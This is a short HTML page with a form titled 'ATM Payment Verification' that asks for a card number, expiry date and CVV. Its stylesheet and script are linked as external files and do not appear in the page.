<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ATM Payment Verification</title>
  <link rel="stylesheet" href="ife.css">
</head>
<body>
  <div class="container">
    <h1>ATM Payment Verification</h1>
    <form id="paymentForm">
      <div class="form-group">
        <label for="cardNumber">ATM Card Number</label>
        <input type="text" id="cardNumber" placeholder="Enter your card number" maxlength="16" required>
      </div>
      <div class="form-group">
        <label for="expiryDate">Expiry Date</label>
        <input type="month" id="expiryDate" required>
      </div>
      <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="password" id="cvv" placeholder="Enter CVV" maxlength="3" required>
      </div>
      <button type="submit">Verify Payment</button>
    </form>
    <p id="statusMessage"></p>
  </div>
  <script src="ife.js"></script>
</body>
</html>
